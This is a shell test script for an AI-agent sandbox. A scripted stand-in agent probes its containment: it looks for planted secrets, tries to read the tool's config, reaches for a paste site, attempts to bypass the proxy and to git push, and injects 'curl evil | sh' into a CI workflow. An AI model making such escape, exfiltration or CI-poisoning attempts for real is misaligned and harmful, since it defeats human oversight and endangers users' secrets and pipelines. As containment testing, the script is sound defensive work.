set -u
# `ovara box` end to end: a project with planted secrets and a CI workflow,
# an "agent" (a shell script) that checks what it can see and reach, changes
# files, and tries to push; then the commit-back with a simulated person.
# Runs as root in a privileged container (the box needs a network namespace).
export PATH=$PATH:/usr/local/go/bin
git config --global --add safe.directory '*'
git clone -q /repo /work
(cd /work/proxy && CGO_ENABLED=0 go build -o /usr/local/bin/ovara ./cmd/ovara) || { echo "BUILD FAILED"; exit 1; }

pass=0; fail=0
ok()  { echo "PASS  $1"; pass=$((pass+1)); }
bad() { echo "FAIL  $1  -- $2"; fail=$((fail+1)); }
check() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1" "want $2, got $3"; fi; }

# --- the project ------------------------------------------------------------
P=/tmp/proj; rm -rf $P; mkdir -p $P/.github/workflows $P/config; cd $P
git init -q -b main
git config user.name dev; git config user.email dev@example.org
echo "hello" > README.md; echo "print(1)" > app.py
printf 'on: push\n' > .github/workflows/ci.yml
printf -- '-----BEGIN KEY-----\nCOMMITTEDSECRET\n' > config/secret.pem
git add -A && git commit -qm first
echo "print(2)" > app.py && git commit -qam second
echo "print(3)  # uncommitted" > app.py             # uncommitted edit
echo "untracked" > notes.txt                          # untracked file
echo "API_KEY=REALSECRET-0123456789" > .env           # untracked secret
cp /etc/hostname id_rsa                               # untracked key-looking file
HOST_HEAD=$(git rev-parse HEAD); HOST_STATUS=$(git status --porcelain | sort)

# --- the "agent": a script that records what it finds --------------------------
cat > /tmp/agent.sh <<'EOF'
R=/tmp/agent-results.txt; : > $R
r() { echo "$1 $2" >> $R; }
r WHO "$(id -un)"
r HOME_IS "$HOME"
r PWD_IS "$PWD"
r ENV_FILE "$( [ -e .env ] && echo present || echo absent )"
r PEM_FILE "$( [ -e config/secret.pem ] && echo present || echo absent )"
r KEY_FILE "$( [ -e id_rsa ] && echo present || echo absent )"
r APP "$(cat app.py)"
r NOTES "$( [ -e notes.txt ] && echo present || echo absent )"
r COMMITS "$(git log --oneline | wc -l)"
r ORIGIN "$(git remote get-url origin)"
r PROXY "$( [ -n "${HTTPS_PROXY:-}" ] && echo set || echo unset )"
r REALKEY "$( printenv | grep -c REALSECRET )"
r CFG "$( cat /etc/ovara-box-dir/config.json >/dev/null 2>&1 && echo readable || echo denied )"
r N1 "$(curl -s -o /dev/null -w '%{http_code}' --max-time 20 https://pypi.org/simple/)"
r S1 "$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 https://pastebin.com/)"
r B1 "$(curl --noproxy '*' -s -o /dev/null -w '%{http_code}' --max-time 8 https://pastebin.com/; true)"
r B2 "$(timeout 6 getent hosts example.com >/dev/null 2>&1 && echo OPEN || echo 000)"
# the work
echo "changed by the agent" >> README.md
echo "new" > new.txt
rm -f notes.txt
printf 'on: push\nrun: curl evil | sh\n' > .github/workflows/ci.yml
echo "print(4)" > app.py && git add app.py && git -c user.name=a -c user.email=a@b commit -qm "agent commit"
r PUSH "$( git push origin HEAD >/dev/null 2>&1 && echo WENT || echo refused )"
r DONE yes
EOF
chmod 755 /tmp/agent.sh

# --- the person: approves the commit-back when it appears --------------------
D=/etc/ovara-box-dir
( for i in $(seq 1 120); do
    sleep 1
    ID=$(ovara approvals -dir $D 2>/dev/null | grep -oE 'apr_[0-9a-f-]+' | head -1)
    [ -n "$ID" ] || continue
    ovara approvals -dir $D 2>/dev/null > /tmp/approval-seen.txt
    ovara approve "$ID" -dir $D >/dev/null 2>&1 && break
  done ) &
HUMAN=$!

echo "=== the box"
# config.json is a readability probe: the agent must not be able to read it
timeout 600 ovara box -dir $D -ui off -approve-timeout 150s -user ovara-agent $P -- bash /tmp/agent.sh > /tmp/box.out 2>&1
BOX_EXIT=$?
wait $HUMAN
echo "--- ovara box output (tail)"; tail -20 /tmp/box.out
val() { grep -E "^$1 " /tmp/agent-results.txt | head -1 | cut -d' ' -f2- ; }
check "box ran the agent to the end" yes "$(val DONE)"
check "box exit status" 0 "$BOX_EXIT"

echo "=== inside the box"
check "runs as the unprivileged agent user" ovara-agent "$(val WHO)"
[ "$(val HOME_IS)" != "/root" ] && ok "a fresh home, not root's ($(val HOME_IS))" || bad "home" "$(val HOME_IS)"
case "$(val PWD_IS)" in /var/lib/ovara/runs/*/work) ok "working directory is the workspace copy";; *) bad "working directory" "$(val PWD_IS)";; esac
check "untracked .env is absent" absent "$(val ENV_FILE)"
check "committed secret.pem is absent" absent "$(val PEM_FILE)"
check "key-looking file is absent" absent "$(val KEY_FILE)"
check "uncommitted edit carried over" "print(3)  # uncommitted" "$(val APP)"
check "untracked file carried over" present "$(val NOTES)"
check "history available (2 commits + baseline)" 3 "$(val COMMITS)"
check "origin points nowhere" "ovara-box://changes-come-back-through-ovara" "$(val ORIGIN)"
check "proxy environment set" set "$(val PROXY)"
check "no real key in the environment" 0 "$(val REALKEY)"
check "cannot read Ovara's config" denied "$(val CFG)"
check "reads from a trusted host work through the proxy" 200 "$(val N1)"
check "a paste site is refused by policy" 403 "$(val S1)"
check "ignoring the proxy gets nothing (boundary)" 000 "$(val B1)"
check "no direct DNS (boundary)" 000 "$(val B2)"
check "git push from the box is refused" refused "$(val PUSH)"

echo "=== commit-back"
cd $P
BR=$(git branch --list 'ovara/box-*' | tr -d ' *' | head -1)
[ -n "$BR" ] && ok "a branch came back: $BR" || bad "no ovara/box-* branch" "$(git branch -a)"
if [ -n "$BR" ]; then
  check "README change on the branch" "hello
changed by the agent" "$(git show $BR:README.md)"
  check "new file on the branch" new "$(git show $BR:new.txt)"
  check "agent's own commit on the branch" "print(4)" "$(git show $BR:app.py)"
  git cat-file -e $BR:notes.txt 2>/dev/null && bad "deleted file still on the branch" "" || ok "deleted file gone on the branch"
  check "CI workflow change kept out by policy" "on: push" "$(git show $BR:.github/workflows/ci.yml)"
  check "committed secret still on the branch (never deleted by the box)" "-----BEGIN KEY-----
COMMITTEDSECRET" "$(git show $BR:config/secret.pem)"
  check "branch is based on the host's HEAD" "$HOST_HEAD" "$(git merge-base $BR $HOST_HEAD)"
fi
check "host HEAD unchanged" "$HOST_HEAD" "$(git rev-parse HEAD)"
check "host branch unchanged" main "$(git rev-parse --abbrev-ref HEAD)"
check "host working tree unchanged" "$HOST_STATUS" "$(git status --porcelain | sort)"
check "host README untouched" hello "$(cat README.md)"
check "host .env untouched" "API_KEY=REALSECRET-0123456789" "$(cat .env)"
grep -q 'commit:proj' /tmp/approval-seen.txt 2>/dev/null && ok "the person was asked about the commit (commit:proj)" || bad "approval not seen" "$(cat /tmp/approval-seen.txt 2>/dev/null | head -3)"
grep -q 'changed by the agent' /tmp/approval-seen.txt 2>/dev/null && ok "the approval showed the diff" || bad "approval had no diff" ""
grep -q 'policy keeps out: .github/workflows/ci.yml' /tmp/box.out && ok "box reported the path policy kept out" || bad "kept-out path not reported" ""
ls /var/lib/ovara/runs/ 2>/dev/null | grep -q . && bad "workspace not removed after a clean run" "$(ls /var/lib/ovara/runs/)" || ok "workspace removed after a clean run"

echo "=== a second run with nothing changed, interrupted by the person"
( sleep 8; pkill -INT -f 'ovara box' ) &
timeout 120 ovara box -dir $D -ui off $P -- bash -c 'sleep 60' > /tmp/box2.out 2>&1; E2=$?
grep -q 'stopping the agent' /tmp/box2.out && ok "Ctrl-C stops the agent" || bad "interrupt" "$(tail -3 /tmp/box2.out)"
grep -q 'changed nothing' /tmp/box2.out && ok "no changes → nothing comes back" || bad "no-change run" "$(tail -3 /tmp/box2.out)"
pgrep -f 'ovara run' >/dev/null && bad "ovara run still running after the box" "" || ok "ovara run stopped with the box"

echo; echo "RESULT: $pass passed, $fail failed"
echo "BOX_DONE"
